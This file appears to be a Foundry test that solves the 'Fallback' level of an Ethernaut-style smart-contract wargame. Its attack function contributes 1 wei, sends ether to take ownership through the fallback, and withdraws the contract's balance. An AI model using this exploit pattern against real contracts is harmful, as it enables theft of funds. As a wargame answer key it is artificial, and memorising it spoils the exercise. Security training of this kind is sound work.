// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {FallbackFactory, Fallback} from "../levels/01_Fallback/FallbackFactory.sol";

contract TestFallback is Tests {
    Fallback private level;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new FallbackFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = Fallback(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        level.contribute{value: 1 wei}();
        (bool ok,) = address(level).call{value: 1 wei}("");
        assertTrue(ok);
        level.withdraw();

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
